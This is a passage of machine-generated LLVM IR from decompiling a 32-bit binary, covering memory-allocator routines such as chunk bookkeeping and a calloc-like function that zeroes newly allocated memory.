  store i32 %v1_80531b6, i32* @global_var_8056bec.207, align 4
  %v1_80531be = load i32, i32* @esi, align 4
  %v2_80531be = add i32 %v1_80531be, %v2_80531b6
  %v1_80531c1 = or i32 %v2_80531be, 1
  store i32 %v1_80531c1, i32* %eax.global-to-local, align 4
  %v2_80531c4 = add i32 %v1_80531b6, 4
  %v3_80531c4 = inttoptr i32 %v2_80531c4 to i32*
  store i32 %v1_80531c1, i32* %v3_80531c4, align 4
  %v0_80531c7 = load i32, i32* @global_var_8056f28.219, align 8
  %v1_80531c7 = load i32, i32* @esi, align 4
  %v2_80531c7 = add i32 %v1_80531c7, %v0_80531c7
  store i32 %v2_80531c7, i32* @global_var_8056f28.219, align 8
  br i1 %v2_805302e, label %dec_label_pc_805321f, label %dec_label_pc_80531d1

dec_label_pc_80531d1:                             ; preds = %dec_label_pc_80531b6
  %v1_80531d1 = add i32 %v1_805302e, -12
  store i32 %v0_805301b, i32* %ecx.global-to-local, align 4
  %v1_80531d8 = and i32 %v1_80531d1, -8
  store i32 %v1_80531d8, i32* %eax.global-to-local, align 4
  %v1_80531dd = or i32 %v1_80531d8, 1
  store i32 %v1_80531dd, i32* @edx, align 4
  %v5_80531e0 = icmp ult i32 %v1_80531d8, 15
  store i32 %v1_80531dd, i32* %v2_8053024, align 4
  %v0_80531e6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80531e6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80531e6 = add i32 %v0_80531e6, 4
  %v3_80531e6 = add i32 %v2_80531e6, %v1_80531e6
  %v4_80531e6 = inttoptr i32 %v3_80531e6 to i32*
  store i32 5, i32* %v4_80531e6, align 4
  %v0_80531ee = load i32, i32* %ecx.global-to-local, align 4
  %v1_80531ee = load i32, i32* %eax.global-to-local, align 4
  %v2_80531ee = add i32 %v0_80531ee, 8
  %v3_80531ee = add i32 %v2_80531ee, %v1_80531ee
  %v4_80531ee = inttoptr i32 %v3_80531ee to i32*
  store i32 5, i32* %v4_80531ee, align 4
  br i1 %v5_80531e0, label %dec_label_pc_805321f, label %dec_label_pc_80531f8

dec_label_pc_80531f8:                             ; preds = %dec_label_pc_80531d1
  %v0_80531fb = load i32, i32* %ecx.global-to-local, align 4
  %v1_80531fd = add i32 %v0_80531fb, 8
  store i32 %v1_80531fd, i32* %eax.global-to-local, align 4
  %v0_8053200 = load i32, i32* @global_var_8056f04.223, align 4
  store i32 %v0_8053200, i32* @ebx, align 4
  store i32 %v1_80531fd, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8056f04.223, align 4
  %v1_8053211 = call i32 @function_8053949(i32 %v1_80531fd)
  store i32 %v1_8053211, i32* %eax.global-to-local, align 4
  %v0_8053216 = load i32, i32* @ebx, align 4
  store i32 %v0_8053216, i32* @global_var_8056f04.223, align 4
  br label %dec_label_pc_805321f

dec_label_pc_805321f:                             ; preds = %dec_label_pc_80531d1, %dec_label_pc_80531b6, %dec_label_pc_80531b1, %dec_label_pc_80530e0, %dec_label_pc_80531f8
  %v0_805321f = load i32, i32* @global_var_8056f28.219, align 8
  store i32 %v0_805321f, i32* %eax.global-to-local, align 4
  %v1_8053224 = load i32, i32* @global_var_8056f2c.224, align 4
  %tmp133 = icmp ugt i32 %v0_805321f, %v1_8053224
  br i1 %tmp133, label %dec_label_pc_805322c, label %dec_label_pc_8053231

dec_label_pc_805322c:                             ; preds = %dec_label_pc_805321f
  store i32 %v0_805321f, i32* @global_var_8056f2c.224, align 4
  br label %dec_label_pc_8053231

dec_label_pc_8053231:                             ; preds = %dec_label_pc_805321f, %dec_label_pc_805322c
  %v1_8053231 = load i32, i32* @global_var_8056f24.217, align 4
  %v2_8053231 = add i32 %v1_8053231, %v0_805321f
  store i32 %v2_8053231, i32* %eax.global-to-local, align 4
  %v1_8053237 = load i32, i32* @global_var_8056f34.220, align 4
  %tmp134 = icmp ugt i32 %v2_8053231, %v1_8053237
  br i1 %tmp134, label %dec_label_pc_805323f, label %dec_label_pc_8053244

dec_label_pc_805323f:                             ; preds = %dec_label_pc_8053231
  store i32 %v2_8053231, i32* @global_var_8056f34.220, align 4
  br label %dec_label_pc_8053244

dec_label_pc_8053244:                             ; preds = %dec_label_pc_8053231, %dec_label_pc_805323f
  %v0_8053244 = load i32, i32* @global_var_8056bec.207, align 4
  store i32 %v0_8053244, i32* @ebx, align 4
  %v1_805324a = add i32 %v0_8053244, 4
  %v2_805324a = inttoptr i32 %v1_805324a to i32*
  %v3_805324a = load i32, i32* %v2_805324a, align 4
  %v1_805324d = and i32 %v3_805324a, -4
  store i32 %v1_805324d, i32* %ecx.global-to-local, align 4
  %v10_8053250 = icmp ult i32 %v1_805324d, %v1_8052eed
  br i1 %v10_8053250, label %dec_label_pc_80532d0, label %dec_label_pc_8053256

dec_label_pc_8053256:                             ; preds = %dec_label_pc_8053244
  store i32 %v1_8052f78, i32* %esi.global-to-local, align 4
  %v2_805325c = sub i32 %v1_805324d, %v1_8052f78
  store i32 %v2_805325c, i32* %ecx.global-to-local, align 4
  %v2_805325e = add i32 %v0_8053244, %v1_8052f78
  store i32 %v2_805325e, i32* @edx, align 4
  %v1_8053261 = or i32 %v1_8052f78, 1
  store i32 %v1_8053261, i32* %eax.global-to-local, align 4
  store i32 %v2_805325e, i32* @global_var_8056bec.207, align 4
  store i32 %v1_8053261, i32* %v2_805324a, align 4
  %v0_805326d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805326d

dec_label_pc_805326d:                             ; preds = %dec_label_pc_8052efe, %dec_label_pc_8053256
  %v0_805326d = phi i32 [ %v5_8052f11, %dec_label_pc_8052efe ], [ %v0_805326d.pre, %dec_label_pc_8053256 ]
  %v1_805326d = or i32 %v0_805326d, 1
  store i32 %v1_805326d, i32* %ecx.global-to-local, align 4
  %v0_8053270 = load i32, i32* @ebx, align 4
  %v1_8053270 = add i32 %v0_8053270, 8
  store i32 %v1_8053270, i32* %ebx.global-to-local, align 4
  %v1_8053273 = load i32, i32* @edx, align 4
  %v2_8053273 = add i32 %v1_8053273, 4
  %v3_8053273 = inttoptr i32 %v2_8053273 to i32*
  store i32 %v1_805326d, i32* %v3_8053273, align 4
  br label %dec_label_pc_80532dd

dec_label_pc_8053278:                             ; preds = %dec_label_pc_8052cb8
  %v5_805327e = sub i32 %v1_8052c9b, %v1_8052f78
  store i32 %v5_805327e, i32* %eax.global-to-local, align 4
  %v2_8053282 = add i32 %v1_805328f, %v1_8052f78
  store i32 %v2_8053282, i32* @edx, align 4
  %v1_8053286 = or i32 %v1_8052f78, 1
  store i32 %v2_8053282, i32* @global_var_8056bf0.208, align 16
  store i32 %v1_8053286, i32* %v2_8052c95, align 4
  %v0_8053292 = load i32, i32* %eax.global-to-local, align 4
  %v0_8053294 = load i32, i32* @edx, align 4
  store i32 %v0_8053294, i32* @global_var_8056bfc.225, align 4
  %v1_805329a = or i32 %v0_8053292, 1
  store i32 %v1_805329a, i32* %ecx.global-to-local, align 4
  store i32 %v0_8053294, i32* @global_var_8056c00.210, align 1024
  %v1_80532a3 = add i32 %v0_8053294, 8
  %v2_80532a3 = inttoptr i32 %v1_80532a3 to i32*
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %v2_80532a3, align 4
  %v0_80532aa = load i32, i32* @edx, align 4
  %v1_80532aa = add i32 %v0_80532aa, 12
  %v2_80532aa = inttoptr i32 %v1_80532aa to i32*
  store i32 ptrtoint (i32* @global_var_8056bf4.209 to i32), i32* %v2_80532aa, align 4
  %v0_80532b1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80532b1 = load i32, i32* @edx, align 4
  %v2_80532b1 = add i32 %v1_80532b1, 4
  %v3_80532b1 = inttoptr i32 %v2_80532b1 to i32*
  store i32 %v0_80532b1, i32* %v3_80532b1, align 4
  %v0_80532b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80532b4 = load i32, i32* @edx, align 4
  %v3_80532b4 = add i32 %v1_80532b4, %v0_80532b4
  %v4_80532b4 = inttoptr i32 %v3_80532b4 to i32*
  store i32 %v0_80532b4, i32* %v4_80532b4, align 4
  br label %dec_label_pc_80532c2

dec_label_pc_80532b9:                             ; preds = %dec_label_pc_8052cc7
  store i32 %v1_8052f78, i32* %ebx.global-to-local, align 4
  %v0_80532bd = load i32, i32* @ebp, align 4
  %v2_80532bd = or i32 %v1_8052f78, 4
  %v3_80532bd = add i32 %v0_80532bd, %v2_80532bd
  %v4_80532bd = inttoptr i32 %v3_80532bd to i32*
  %v5_80532bd = load i32, i32* %v4_80532bd, align 4
  %v6_80532bd = or i32 %v5_80532bd, 1
  store i32 %v6_80532bd, i32* %v4_80532bd, align 4
  br label %dec_label_pc_80532c2

dec_label_pc_80532c2:                             ; preds = %dec_label_pc_8053278, %dec_label_pc_80532b9
  %v0_80532c2 = load i32, i32* @ebp, align 4
  %v1_80532c2 = add i32 %v0_80532c2, 8
  store i32 %v1_80532c2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532dd

dec_label_pc_80532c7:                             ; preds = %dec_label_pc_8052db7
  %v1_80532c7 = load i32, i32* @ebx, align 4
  %v2_80532c7 = add i32 %v0_8052dc6, 4
  %v3_80532c7 = add i32 %v2_80532c7, %v1_80532c7
  %v4_80532c7 = inttoptr i32 %v3_80532c7 to i32*
  %v5_80532c7 = load i32, i32* %v4_80532c7, align 4
  %v6_80532c7 = or i32 %v5_80532c7, 1
  store i32 %v6_80532c7, i32* %v4_80532c7, align 4
  br label %dec_label_pc_80532cc

dec_label_pc_80532cc:                             ; preds = %dec_label_pc_8052dcf, %dec_label_pc_80532c7
  %v0_80532cc = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80532cc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532dd

dec_label_pc_80532d0:                             ; preds = %dec_label_pc_805308e, %dec_label_pc_8053244, %dec_label_pc_8053098
  %v0_80532d0 = load i32, i32* %stack_var_-92, align 4
  %v1_80532d0 = call i32 @function_8052729(i32 %v0_80532d0)
  store i32 %v1_80532d0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80532d7 = inttoptr i32 %v1_80532d0 to i32*
  store i32 12, i32* %v1_80532d7, align 4
  br label %dec_label_pc_80532dd

dec_label_pc_80532dd:                             ; preds = %dec_label_pc_80532cc, %dec_label_pc_80532c2, %dec_label_pc_805326d, %dec_label_pc_8052f29, %dec_label_pc_8052edb, %dec_label_pc_8052c62, %dec_label_pc_80532d0
  store i32 %v2_8052b99, i32* @eax, align 4
  store i32 %v2_8052b99, i32* %stack_var_-92, align 4
  %v2_80532e6 = call i32 @function_80540b0(i32 %v2_8052b99, i32 1)
  store i32 %v2_80532e6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532ee

dec_label_pc_80532ee:                             ; preds = %dec_label_pc_8052bb7, %dec_label_pc_80532dd
  %v0_80532f1 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80532f1, i32* %eax.global-to-local, align 4
  store i32 %v0_8052b86, i32* @esi, align 4
  store i32 %v0_8052b85, i32* @edi, align 4
  store i32 %v0_8052b84, i32* @ebp, align 4
  ret i32 %v0_80532f1

; uselistorder directives
  uselistorder i32 %v0_80532b4, { 1, 0 }
  uselistorder i32 %v0_8053294, { 1, 0, 2 }
  uselistorder i32 %v2_8053231, { 1, 0, 2 }
  uselistorder i32 %v0_805321f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80531b6, { 1, 0 }
  uselistorder i32 %v2_80531a4, { 1, 0 }
  uselistorder i32 %v1_805315b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8053145, { 1, 0, 2 }
  uselistorder i32 %v2_8053139, { 1, 2, 0 }
  uselistorder i32 %v2_8053134, { 1, 0, 2 }
  uselistorder i32 %v1_8053124, { 2, 1, 0 }
  uselistorder i8 %v0_80530f2, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80530d5, { 1, 0, 2 }
  uselistorder i32 %v0_805318993, { 2, 0, 1 }
  uselistorder i32 %v0_805319794, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_80530cf, { 2, 1, 0 }
  uselistorder i32 %v8_80530a5, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80530a2, { 1, 0 }
  uselistorder i32 %v0_8053081, { 1, 0 }
  uselistorder i32 %v2_8053052, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805304a, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8053037, { 1, 0 }
  uselistorder i1 %v2_805302e, { 2, 1, 0 }
  uselistorder i32 %v1_805302e, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_805301b, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8052fff, { 1, 0, 2 }
  uselistorder i32 %v2_8052feb, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052fb4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052fa8, { 2, 1, 0 }
  uselistorder i32 %v8_8052f97, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8052f7e, { 1, 0, 2 }
  uselistorder i32 %v0_8052f1a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8052eed, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052ee3, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052ed5, { 1, 0 }
  uselistorder i32 %v1_8052e6c, { 1, 0 }
  uselistorder i32 %v3_8052e60, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052e70, { 1, 0 }
  uselistorder i32 %v2_8052e5a, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8052e577, { 1, 0 }
  uselistorder i32 %v2_8052e4c, { 1, 0 }
  uselistorder i32 %v1_8052e30, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052e2c, { 2, 1, 0 }
  uselistorder i32 %v1_8052e28, { 1, 0 }
  uselistorder i32 %v1_8052e1c, { 2, 1, 0 }
  uselistorder i32 %v2_8052e12, { 1, 0 }
  uselistorder i32 %v1_8052e0f, { 1, 2, 0 }
  uselistorder i32 %v4_8052dad, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8052df8, { 1, 0 }
  uselistorder i32 %v0_8052dc6, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052d99, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052d66, { 0, 2, 1 }
  uselistorder i32 %v2_8052d4a, { 1, 0 }
  uselistorder i32 %v1_8052d40, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052d3b.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052d2b, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052d22, { 1, 0, 2 }
  uselistorder i32 %v2_8052cfe, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052ce6, { 2, 1, 0 }
  uselistorder i32 %v0_8052cd2, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8052c98, { 1, 0, 2 }
  uselistorder i32 %v1_805328f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8052d669, { 1, 0, 2 }
  uselistorder i32 %v3_8052c45, { 1, 0, 2 }
  uselistorder i32 %v2_8052c37, { 2, 1, 0 }
  uselistorder i32 %v2_8052c12, { 2, 1, 0 }
  uselistorder i8 %v0_8052be0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_8052f78, { 13, 31, 12, 2, 29, 11, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8052bc9, { 0, 2, 1 }
  uselistorder i32 %v0_8052bb2, { 1, 0 }
  uselistorder i32 %v2_8052b99, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8056f20.222, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_80543c8, { 1, 0 }
  uselistorder i32 134573044, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8056c00.210, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8052b5e, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056bec.207 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8056bec.207 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80532ee, { 1, 0 }
  uselistorder label %dec_label_pc_80532dd, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80532d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80532cc, { 1, 0 }
  uselistorder label %dec_label_pc_80532c2, { 1, 0 }
  uselistorder label %dec_label_pc_805326d, { 1, 0 }
  uselistorder label %dec_label_pc_8053244, { 1, 0 }
  uselistorder label %dec_label_pc_8053231, { 1, 0 }
  uselistorder label %dec_label_pc_805321f, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80531b1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80531ac, { 1, 0 }
  uselistorder label %dec_label_pc_8053190, { 1, 0 }
  uselistorder label %dec_label_pc_8053139, { 1, 0 }
  uselistorder label %dec_label_pc_8053122, { 1, 0 }
  uselistorder label %dec_label_pc_805310b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805308e, { 1, 0 }
  uselistorder label %dec_label_pc_8053081, { 1, 0 }
  uselistorder label %dec_label_pc_8053042, { 1, 0 }
  uselistorder label %dec_label_pc_805301b, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052fff, { 1, 0 }
  uselistorder label %dec_label_pc_8052fe6, { 1, 0 }
  uselistorder label %dec_label_pc_8052fc8, { 1, 0 }
  uselistorder label %dec_label_pc_8052ee3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052edb, { 1, 0 }
  uselistorder label %dec_label_pc_8052ec4, { 1, 0 }
  uselistorder label %dec_label_pc_8052e57, { 1, 0 }
  uselistorder label %dec_label_pc_8052e5c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052e30, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052db7, { 1, 0 }
  uselistorder label %dec_label_pc_8052d66, { 1, 0 }
  uselistorder label %dec_label_pc_8052d3e, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052d27, { 1, 0 }
  uselistorder label %dec_label_pc_8052c95, { 1, 0 }
  uselistorder label %dec_label_pc_8052d66.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c62, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052be0, { 1, 0 }
}

define i32 @function_80532f8(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80532f8:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80532f8 = load i32, i32* @edi, align 4
  %v0_80532fa = load i32, i32* @ebx, align 4
  %v12_80532fb = ptrtoint i32* %stack_var_-28 to i32
  %v4_80532fe = trunc i64 %arg1 to i32
  store i32 %v4_80532fe, i32* @edx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_8053308 = sdiv i64 %sext, 4294967296
  %v3_8053308 = sext i32 %arg2 to i64
  %v4_8053308 = mul nsw i64 %v3_8053308, %v2_8053308
  %v5_8053308 = trunc i64 %v4_8053308 to i32
  store i32 %v5_8053308, i32* @ebx, align 4
  %v2_805330b = icmp eq i32 %v4_80532fe, 0
  br i1 %v2_805330b, label %dec_label_pc_805332d, label %dec_label_pc_805330f

dec_label_pc_805330f:                             ; preds = %dec_label_pc_80532f8
  store i32 %v4_80532fe, i32* @edi, align 4
  %div = udiv i32 %v5_8053308, %v4_80532fe
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp14 = urem i32 %v5_8053308, %v4_80532fe
  store i32 %tmp14, i32* @edx, align 4
  %v12_8053317 = icmp eq i32 %div, %arg2
  br i1 %v12_8053317, label %dec_label_pc_805332d, label %dec_label_pc_805331b

dec_label_pc_805331b:                             ; preds = %dec_label_pc_805330f
  %v1_805331b = call i32 @function_8052729(i32 %v0_80532fa)
  store i32 %v1_805331b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053322 = inttoptr i32 %v1_805331b to i32*
  store i32 12, i32* %v1_8053322, align 4
  br label %dec_label_pc_80533e3

dec_label_pc_805332d:                             ; preds = %dec_label_pc_805330f, %dec_label_pc_80532f8
  store i32 %v12_80532fb, i32* @eax, align 4
  %v2_805333d = call i32 @function_80540b0(i32 %v12_80532fb, i32 134561965)
  store i32 %v2_805333d, i32* %eax.global-to-local, align 4
  %v1_8053349 = call i32 @function_80540ad(i32 ptrtoint (i32* @global_var_8056820.205 to i32))
  store i32 %v1_8053349, i32* %eax.global-to-local, align 4
  %v0_805334e = load i32, i32* @ebx, align 4
  %v1_8053351 = call i32 @function_8052b84(i32 %v0_805334e)
  store i32 %v1_8053351, i32* %eax.global-to-local, align 4
  store i32 %v1_8053351, i32* %ebx.global-to-local, align 4
  %v1_805335b = icmp eq i32 %v1_8053351, 0
  br i1 %v1_805335b, label %dec_label_pc_80533d2, label %dec_label_pc_805335f

dec_label_pc_805335f:                             ; preds = %dec_label_pc_805332d
  %v1_805335f = add i32 %v1_8053351, -4
  %v2_805335f = inttoptr i32 %v1_805335f to i32*
  %v3_805335f = load i32, i32* %v2_805335f, align 4
  store i32 %v3_805335f, i32* %eax.global-to-local, align 4
  %v2_8053362 = and i32 %v3_805335f, 2
  %v3_8053362 = icmp eq i32 %v2_8053362, 0
  %v1_8053364 = icmp eq i1 %v3_8053362, false
  br i1 %v1_8053364, label %dec_label_pc_80533d2, label %dec_label_pc_8053366

dec_label_pc_8053366:                             ; preds = %dec_label_pc_805335f
  %v1_80533663 = add i32 %v3_805335f, -4
  %v1_8053369 = and i32 %v1_80533663, -4
  store i32 %v1_8053369, i32* @edx, align 4
  %v2_805336e = udiv i32 %v1_8053369, 4
  store i32 %v2_805336e, i32* %eax.global-to-local, align 4
  %v5_8053371 = icmp ult i32 %v1_8053369, 36
  %tmp = and i32 %v1_80533663, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8053374 = or i1 %v5_8053371, %tmp18
  br i1 %v2_8053374, label %dec_label_pc_8053385, label %dec_label_pc_8053376

dec_label_pc_8053376:                             ; preds = %dec_label_pc_8053366
  %v3_805337b = inttoptr i32 %v1_8053351 to i8*
  %v4_805337b = call i32 @function_805277a(i8* %v3_805337b, i32 0, i32 %v1_8053369)
  store i32 %v4_805337b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533d2

dec_label_pc_8053385:                             ; preds = %dec_label_pc_8053366
  %v1_8053385 = inttoptr i32 %v1_8053351 to i32*
  store i32 0, i32* %v1_8053385, align 4
  %v0_805338b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805338b = add i32 %v0_805338b, 4
  %v2_805338b = inttoptr i32 %v1_805338b to i32*
  store i32 0, i32* %v2_805338b, align 4
  %v0_8053392 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053392 = add i32 %v0_8053392, 8
  %v2_8053392 = inttoptr i32 %v1_8053392 to i32*
  store i32 0, i32* %v2_8053392, align 4
  %v0_8053399 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8053399, 5
  br i1 %tmp15, label %dec_label_pc_80533d2, label %dec_label_pc_805339e

dec_label_pc_805339e:                             ; preds = %dec_label_pc_8053385
  %v0_805339e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805339e = add i32 %v0_805339e, 12
  %v2_805339e = inttoptr i32 %v1_805339e to i32*
  store i32 0, i32* %v2_805339e, align 4
  %v0_80533a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533a5 = add i32 %v0_80533a5, 16
  %v2_80533a5 = inttoptr i32 %v1_80533a5 to i32*
  store i32 0, i32* %v2_80533a5, align 4
  %v0_80533ac = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_80533ac, 7
  br i1 %tmp16, label %dec_label_pc_80533d2, label %dec_label_pc_80533b1

dec_label_pc_80533b1:                             ; preds = %dec_label_pc_805339e
  %v0_80533b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533b1 = add i32 %v0_80533b1, 20
  %v2_80533b1 = inttoptr i32 %v1_80533b1 to i32*
  store i32 0, i32* %v2_80533b1, align 4
  %v0_80533b8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533b8 = add i32 %v0_80533b8, 24
  %v2_80533b8 = inttoptr i32 %v1_80533b8 to i32*
  store i32 0, i32* %v2_80533b8, align 4
  %v0_80533bf = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_80533bf, 9
  br i1 %tmp17, label %dec_label_pc_80533d2, label %dec_label_pc_80533c4

dec_label_pc_80533c4:                             ; preds = %dec_label_pc_80533b1
  %v0_80533c4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533c4 = add i32 %v0_80533c4, 28
  %v2_80533c4 = inttoptr i32 %v1_80533c4 to i32*
  store i32 0, i32* %v2_80533c4, align 4
  %v0_80533cb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533cb = add i32 %v0_80533cb, 32
  %v2_80533cb = inttoptr i32 %v1_80533cb to i32*
  store i32 0, i32* %v2_80533cb, align 4
  br label %dec_label_pc_80533d2

dec_label_pc_80533d2:                             ; preds = %dec_label_pc_80533b1, %dec_label_pc_805339e, %dec_label_pc_8053385, %dec_label_pc_805335f, %dec_label_pc_805332d, %dec_label_pc_8053376, %dec_label_pc_80533c4
  store i32 %v12_80532fb, i32* @eax, align 4
  %v2_80533db = call i32 @function_80540b0(i32 %v12_80532fb, i32 1)
  store i32 %v2_80533db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533e3

dec_label_pc_80533e3:                             ; preds = %dec_label_pc_805331b, %dec_label_pc_80533d2
  %v0_80533e6 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80533e6, i32* %eax.global-to-local, align 4
  store i32 %v0_80532fa, i32* @ebx, align 4
  store i32 %v0_80532f8, i32* @edi, align 4
  ret i32 %v0_80533e6

; uselistorder directives
  uselistorder i32 %v1_8053369, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8053351, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_8053308, { 1, 0, 2 }
  uselistorder i32 %v4_80532fe, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 11, 8, 12 }
  uselistorder i64 4294967296, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_80533e3, { 1, 0 }
  uselistorder label %dec_label_pc_80533d2, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_80533ec() local_unnamed_addr {
dec_label_pc_80533ec:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80533ec = load i32, i32* @ebp, align 4
  %v0_80533ed = load i32, i32* @edi, align 4
  %v0_80533ee = load i32, i32* @esi, align 4
  %v0_80533ef = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_80533f7 = icmp eq i32 %tmp6, 0
  %v1_80533fc = icmp eq i1 %v4_80533f7, false
  br i1 %v1_80533fc, label %dec_label_pc_805340e, label %dec_label_pc_80533fe

dec_label_pc_80533fe:                             ; preds = %dec_label_pc_80533ec
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8053402 = call i32 @function_8052b84(i32 %tmp7)
  store i32 %v1_8053402, i32* %eax.global-to-local, align 4
  store i32 %v1_8053402, i32* @ebx, align 4
